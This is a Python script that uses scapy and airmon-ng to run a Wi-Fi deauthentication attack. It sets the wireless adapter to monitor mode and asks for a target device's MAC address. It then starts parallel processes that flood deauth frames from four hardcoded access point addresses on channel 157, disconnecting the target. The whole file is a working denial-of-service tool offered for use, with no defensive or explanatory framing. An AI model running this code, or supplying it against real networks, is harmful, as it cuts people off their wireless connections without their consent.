import os
import time
import multiprocessing
import signal
import sys
from scapy.all import *

INTERFACE = "wlan0"

def enable_monitor_mode(interface):
    os.system(f"sudo airmon-ng start {interface}")

def disable_monitor_mode(interface):
    os.system(f"sudo airmon-ng stop {interface}")

def set_channel(interface, channel):
    """Locks adapter to a specific channel"""
    os.system(f"sudo iwconfig {interface} channel {channel}")
    print(f"Switched to channel {channel}")

def deauth_attack(target_bssid, ap_bssid, interface, channel):
    """Sends continuous deauth packets"""
    dot11 = Dot11(addr1=target_bssid, addr2=ap_bssid, addr3=ap_bssid)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    os.system(f"sudo iwconfig {interface} channel {channel}")

    print(f"Sending deauth to {target_bssid} on {ap_bssid}...")
    try:
    
        sendp(packet, inter=0.1, iface=interface, loop=1 ,verbose=False)
        
    except KeyboardInterrupt:
        print(f'Stopping attack on {target_bssid} from {ap_bssid}')
        sys.exit(0)
        
processes = []

def stop_attack(signal_received, frame):
    for p in processes:
        if p.is_alive():
            p.terminate()
            p.join()
    sys.exit(0)
            
        
signal.signal(signal.SIGINT, stop_attack)

if __name__ == "__main__":
    try:
        enable_monitor_mode(INTERFACE)
        mon_interface = INTERFACE

        target_bssid = input("Enter target device MAC address: ")

        # Predefined AP info
        ap_info = [
            ("5C:7D:7D:C3:C8:B7", 157), 
            ("3A:B7:F1:93:A5:AE", 157), ("3A:B7:F1:7D:13:C8", 157), 
            ("3A:B7:F1:93:A7:6E", 157)]
            

       
        for ap_bssid, channel in ap_info:
            p = multiprocessing.Process(target=deauth_attack, args=(target_bssid, ap_bssid, mon_interface, channel))
            p.start()
            processes.append(p)
            
        #Keep script running to manage processes
        for p in processes:
            p.join()

        print("\n[+] Deauthentication attack running on all detected APs...")

    except KeyboardInterrupt:
        print("\nStopping attack...")
        stop_attack(None, None)

    finally:
        disable_monitor_mode(INTERFACE)
